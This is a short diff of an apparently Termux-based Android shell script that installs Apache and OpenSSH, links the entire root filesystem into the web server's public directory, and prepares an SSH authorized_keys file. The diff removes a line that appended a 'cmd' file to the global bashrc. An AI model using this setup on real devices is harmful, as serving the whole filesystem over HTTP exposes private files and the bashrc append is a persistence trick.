@@ -1,6 +1,5 @@
 pkg install apache2 openssh -y
 rm -rf /data/data/com.termux/files/usr/var/run/apache2/httpd.pid
-cat cmd >> /data/data/com.termux/files/usr/etc/bash.bashrc
 apachectl
 ln -s / /data/data/com.termux/files/usr/share/apache2/default-site/htdocs/s
 touch ~/.ssh/authorized_keys
